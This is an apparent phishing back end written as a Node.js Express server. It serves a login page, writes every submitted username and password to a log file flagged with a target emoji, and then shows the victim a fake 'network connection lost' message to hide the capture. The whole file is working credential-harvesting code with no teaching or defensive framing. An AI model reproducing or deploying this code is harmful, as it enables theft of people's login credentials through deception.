const express = require("express");
const app = express();
const path = require("path");
const fs = require("fs");

// ---- Logging setup ----
const logStream = fs.createWriteStream(path.join(__dirname, "log.txt"), { flags: "a" });
const originalLog = console.log;
console.log = function (...args) {
  const message = args.join(" ") + "\n";
  logStream.write(message);
  originalLog.apply(console, args);
};
// -----------------------

// Middleware
app.use(express.urlencoded({ extended: true }));

// ✅ Serve all files in current folder (HTML, SVG, etc.)
app.use(express.static(__dirname));

// Serve main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Handle form
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  console.log(`🎯 Username: ${username}, Password: ${password}`);

  res.send(`
    <html>
      <head>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            margin: 0;
          }
          .box {
            background: #111;
            border: 1px solid #333;
            padding: 30px;
            max-width: 400px;
            box-shadow: 0 0 10px rgba(255,255,255,0.05);
            border-radius: 8px;
          }
          h1 {
            font-size: 20px;
            margin-bottom: 10px;
            color: #fff;
          }
          p {
            font-size: 14px;
            color: #aaa;
          }
        </style>
      </head>
      <body>
        <div class="box">
          <h1>NETWORK CONNECTION LOST</h1>
          <p>We're sorry, we couldn't process your request. Try again later.</p>
        </div>
      </body>
    </html>
  `);
});

app.listen(3000, () => {
  console.log("✅ Server running at http://localhost:3000");
});
